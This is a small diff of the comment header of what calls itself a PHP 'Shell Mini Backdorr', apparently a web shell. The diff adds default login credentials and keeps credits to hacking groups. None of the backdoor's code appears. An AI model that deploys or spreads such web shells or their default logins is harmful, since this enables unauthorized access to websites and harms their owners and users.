@@ -3,7 +3,8 @@
 //** Shell Mini Backdorr V 2.0
 //** Author r00t@star feat Mr.S03
 //** Other shell backdorr Please Call me or mr s03 
-/** PHP Coded **/
+/** Default password : Indonesia **/
+/** Default Username : TanahAir **/
 /** Thx To : Sunda Cyber Army **/
 /** Special Thx : Indoxploit, TatSumy Crew, Mr. D, Google search engine **/
 //** Jika Terjadi error silahkan chat saya awoakawoak **//
